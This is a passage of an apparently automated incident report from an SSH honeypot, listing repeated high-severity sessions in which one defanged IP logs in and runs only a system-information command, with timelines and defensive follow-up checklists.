| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:24` | `cowrie.session.connect` |
| `2026-07-28 05:01:24` | `cowrie.client.version` |
| `2026-07-28 05:01:24` | `cowrie.client.kex` |
| `2026-07-28 05:01:26` | `cowrie.login.success` |
| `2026-07-28 05:01:27` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.223.152[.]69` to AbuseIPDB if not already reported
- [ ] Block `117.223.152[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1e1f8853aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:28` | `cowrie.session.connect` |
| `2026-07-28 05:01:29` | `cowrie.client.version` |
| `2026-07-28 05:01:29` | `cowrie.client.kex` |
| `2026-07-28 05:01:34` | `cowrie.login.success` |
| `2026-07-28 05:01:36` | `cowrie.session.params` |
| `2026-07-28 05:01:36` | `cowrie.command.input` |
| `2026-07-28 05:01:38` | `cowrie.log.closed` |
| `2026-07-28 05:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d81506813f49

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:34` | `cowrie.session.connect` |
| `2026-07-28 05:01:35` | `cowrie.client.version` |
| `2026-07-28 05:01:35` | `cowrie.client.kex` |
| `2026-07-28 05:01:40` | `cowrie.login.success` |
| `2026-07-28 05:01:42` | `cowrie.session.params` |
| `2026-07-28 05:01:42` | `cowrie.command.input` |
| `2026-07-28 05:01:44` | `cowrie.log.closed` |
| `2026-07-28 05:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb79fa4518f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:40` | `cowrie.session.connect` |
| `2026-07-28 05:01:41` | `cowrie.client.version` |
| `2026-07-28 05:01:41` | `cowrie.client.kex` |
| `2026-07-28 05:01:46` | `cowrie.login.success` |
| `2026-07-28 05:01:48` | `cowrie.session.params` |
| `2026-07-28 05:01:48` | `cowrie.command.input` |
| `2026-07-28 05:01:49` | `cowrie.log.closed` |
| `2026-07-28 05:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e4129c63f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:47` | `cowrie.session.connect` |
| `2026-07-28 05:01:48` | `cowrie.client.version` |
| `2026-07-28 05:01:48` | `cowrie.client.kex` |
| `2026-07-28 05:01:51` | `cowrie.login.success` |
| `2026-07-28 05:01:53` | `cowrie.session.params` |
| `2026-07-28 05:01:53` | `cowrie.command.input` |
| `2026-07-28 05:01:54` | `cowrie.log.closed` |
| `2026-07-28 05:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ddeae3fa9c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:53` | `cowrie.session.connect` |
| `2026-07-28 05:01:54` | `cowrie.client.version` |
| `2026-07-28 05:01:54` | `cowrie.client.kex` |
| `2026-07-28 05:01:58` | `cowrie.login.success` |
| `2026-07-28 05:02:02` | `cowrie.session.params` |
| `2026-07-28 05:02:02` | `cowrie.command.input` |
| `2026-07-28 05:02:03` | `cowrie.log.closed` |
| `2026-07-28 05:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008395a2e7d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:59` | `cowrie.session.connect` |
| `2026-07-28 05:02:00` | `cowrie.client.version` |
| `2026-07-28 05:02:00` | `cowrie.client.kex` |
| `2026-07-28 05:02:04` | `cowrie.login.success` |
| `2026-07-28 05:02:06` | `cowrie.session.params` |
| `2026-07-28 05:02:06` | `cowrie.command.input` |
| `2026-07-28 05:02:08` | `cowrie.log.closed` |
| `2026-07-28 05:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72b41ae7ca60

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:05` | `cowrie.session.connect` |
| `2026-07-28 05:02:06` | `cowrie.client.version` |
| `2026-07-28 05:02:06` | `cowrie.client.kex` |
| `2026-07-28 05:02:11` | `cowrie.login.success` |
| `2026-07-28 05:02:14` | `cowrie.session.params` |
| `2026-07-28 05:02:14` | `cowrie.command.input` |
| `2026-07-28 05:02:15` | `cowrie.log.closed` |
| `2026-07-28 05:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a556ca49438e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:11` | `cowrie.session.connect` |
| `2026-07-28 05:02:12` | `cowrie.client.version` |
| `2026-07-28 05:02:12` | `cowrie.client.kex` |
| `2026-07-28 05:02:16` | `cowrie.login.success` |
| `2026-07-28 05:02:20` | `cowrie.session.params` |
| `2026-07-28 05:02:20` | `cowrie.command.input` |
| `2026-07-28 05:02:22` | `cowrie.log.closed` |
| `2026-07-28 05:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d10817bb61c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:17` | `cowrie.session.connect` |
| `2026-07-28 05:02:19` | `cowrie.client.version` |
| `2026-07-28 05:02:19` | `cowrie.client.kex` |
| `2026-07-28 05:02:24` | `cowrie.login.success` |
| `2026-07-28 05:02:28` | `cowrie.session.params` |
| `2026-07-28 05:02:28` | `cowrie.command.input` |
| `2026-07-28 05:02:28` | `cowrie.log.closed` |
| `2026-07-28 05:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d22ab6a008

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:23` | `cowrie.session.connect` |
| `2026-07-28 05:02:24` | `cowrie.client.version` |
| `2026-07-28 05:02:24` | `cowrie.client.kex` |
| `2026-07-28 05:02:29` | `cowrie.login.success` |
| `2026-07-28 05:02:32` | `cowrie.session.params` |
| `2026-07-28 05:02:32` | `cowrie.command.input` |
| `2026-07-28 05:02:34` | `cowrie.log.closed` |
| `2026-07-28 05:02:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11aad12c23cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:29` | `cowrie.session.connect` |
| `2026-07-28 05:02:30` | `cowrie.client.version` |
| `2026-07-28 05:02:30` | `cowrie.client.kex` |
| `2026-07-28 05:02:35` | `cowrie.login.success` |
| `2026-07-28 05:02:38` | `cowrie.session.params` |
| `2026-07-28 05:02:38` | `cowrie.command.input` |
| `2026-07-28 05:02:39` | `cowrie.log.closed` |
| `2026-07-28 05:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee629d99575d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:35` | `cowrie.session.connect` |
| `2026-07-28 05:02:36` | `cowrie.client.version` |
| `2026-07-28 05:02:36` | `cowrie.client.kex` |
| `2026-07-28 05:02:40` | `cowrie.login.success` |
| `2026-07-28 05:02:43` | `cowrie.session.params` |
| `2026-07-28 05:02:43` | `cowrie.command.input` |
| `2026-07-28 05:02:44` | `cowrie.log.closed` |
| `2026-07-28 05:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5735163d23e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:42` | `cowrie.session.connect` |
| `2026-07-28 05:02:43` | `cowrie.client.version` |
| `2026-07-28 05:02:43` | `cowrie.client.kex` |
| `2026-07-28 05:02:47` | `cowrie.login.success` |
| `2026-07-28 05:02:50` | `cowrie.session.params` |
| `2026-07-28 05:02:50` | `cowrie.command.input` |
| `2026-07-28 05:02:51` | `cowrie.log.closed` |
| `2026-07-28 05:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabad8f9c583

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:47` | `cowrie.session.connect` |
| `2026-07-28 05:02:47` | `cowrie.client.version` |
| `2026-07-28 05:02:47` | `cowrie.client.kex` |
| `2026-07-28 05:02:53` | `cowrie.login.success` |
| `2026-07-28 05:02:56` | `cowrie.session.params` |
| `2026-07-28 05:02:56` | `cowrie.command.input` |
| `2026-07-28 05:02:57` | `cowrie.log.closed` |
| `2026-07-28 05:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aecd7393788

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:52` | `cowrie.session.connect` |
| `2026-07-28 05:02:53` | `cowrie.client.version` |
| `2026-07-28 05:02:53` | `cowrie.client.kex` |
| `2026-07-28 05:02:58` | `cowrie.login.success` |
| `2026-07-28 05:03:01` | `cowrie.session.params` |
| `2026-07-28 05:03:01` | `cowrie.command.input` |
| `2026-07-28 05:03:01` | `cowrie.log.closed` |
| `2026-07-28 05:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3a1c3d75fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:02 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:02:58` | `cowrie.session.connect` |
| `2026-07-28 05:02:59` | `cowrie.client.version` |
| `2026-07-28 05:02:59` | `cowrie.client.kex` |
| `2026-07-28 05:03:02` | `cowrie.login.success` |
| `2026-07-28 05:03:05` | `cowrie.session.params` |
| `2026-07-28 05:03:05` | `cowrie.command.input` |
| `2026-07-28 05:03:06` | `cowrie.log.closed` |
| `2026-07-28 05:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b233686309a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:03` | `cowrie.session.connect` |
| `2026-07-28 05:03:04` | `cowrie.client.version` |
| `2026-07-28 05:03:04` | `cowrie.client.kex` |
| `2026-07-28 05:03:07` | `cowrie.login.success` |
| `2026-07-28 05:03:09` | `cowrie.session.params` |
| `2026-07-28 05:03:09` | `cowrie.command.input` |
| `2026-07-28 05:03:11` | `cowrie.log.closed` |
| `2026-07-28 05:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-109d1c95af99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:09` | `cowrie.session.connect` |
| `2026-07-28 05:03:10` | `cowrie.client.version` |
| `2026-07-28 05:03:10` | `cowrie.client.kex` |
| `2026-07-28 05:03:13` | `cowrie.login.success` |
| `2026-07-28 05:03:15` | `cowrie.session.params` |
| `2026-07-28 05:03:15` | `cowrie.command.input` |
| `2026-07-28 05:03:16` | `cowrie.log.closed` |
| `2026-07-28 05:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f483b7ea581

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:15` | `cowrie.session.connect` |
| `2026-07-28 05:03:15` | `cowrie.client.version` |
| `2026-07-28 05:03:15` | `cowrie.client.kex` |
| `2026-07-28 05:03:19` | `cowrie.login.success` |
| `2026-07-28 05:03:21` | `cowrie.session.params` |
| `2026-07-28 05:03:21` | `cowrie.command.input` |
| `2026-07-28 05:03:21` | `cowrie.log.closed` |
| `2026-07-28 05:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74fe02f41d41

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:21` | `cowrie.session.connect` |
| `2026-07-28 05:03:21` | `cowrie.client.version` |
| `2026-07-28 05:03:21` | `cowrie.client.kex` |
| `2026-07-28 05:03:23` | `cowrie.login.success` |
| `2026-07-28 05:03:24` | `cowrie.session.params` |
| `2026-07-28 05:03:24` | `cowrie.command.input` |
| `2026-07-28 05:03:24` | `cowrie.log.closed` |
| `2026-07-28 05:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8d7241bf83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:27` | `cowrie.session.connect` |
| `2026-07-28 05:03:27` | `cowrie.client.version` |
| `2026-07-28 05:03:27` | `cowrie.client.kex` |
| `2026-07-28 05:03:28` | `cowrie.login.success` |
| `2026-07-28 05:03:29` | `cowrie.session.params` |
| `2026-07-28 05:03:29` | `cowrie.command.input` |
| `2026-07-28 05:03:29` | `cowrie.log.closed` |
| `2026-07-28 05:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8578172a440c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:33` | `cowrie.session.connect` |
| `2026-07-28 05:03:33` | `cowrie.client.version` |
| `2026-07-28 05:03:33` | `cowrie.client.kex` |
| `2026-07-28 05:03:33` | `cowrie.login.success` |
| `2026-07-28 05:03:34` | `cowrie.session.params` |
| `2026-07-28 05:03:34` | `cowrie.command.input` |
| `2026-07-28 05:03:34` | `cowrie.log.closed` |
| `2026-07-28 05:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006272fa677a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:38` | `cowrie.session.connect` |
| `2026-07-28 05:03:39` | `cowrie.client.version` |
| `2026-07-28 05:03:39` | `cowrie.client.kex` |
| `2026-07-28 05:03:40` | `cowrie.login.success` |
| `2026-07-28 05:03:41` | `cowrie.session.params` |
| `2026-07-28 05:03:41` | `cowrie.command.input` |
| `2026-07-28 05:03:42` | `cowrie.log.closed` |
| `2026-07-28 05:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec88601050c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:44` | `cowrie.session.connect` |
| `2026-07-28 05:03:44` | `cowrie.client.version` |
| `2026-07-28 05:03:44` | `cowrie.client.kex` |
| `2026-07-28 05:03:45` | `cowrie.login.success` |
| `2026-07-28 05:03:46` | `cowrie.session.params` |
| `2026-07-28 05:03:46` | `cowrie.command.input` |
| `2026-07-28 05:03:46` | `cowrie.log.closed` |
| `2026-07-28 05:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6d022bdabf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:50` | `cowrie.session.connect` |
| `2026-07-28 05:03:50` | `cowrie.client.version` |
| `2026-07-28 05:03:50` | `cowrie.client.kex` |
| `2026-07-28 05:03:50` | `cowrie.login.success` |
| `2026-07-28 05:03:51` | `cowrie.session.params` |
| `2026-07-28 05:03:51` | `cowrie.command.input` |
| `2026-07-28 05:03:51` | `cowrie.log.closed` |
| `2026-07-28 05:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
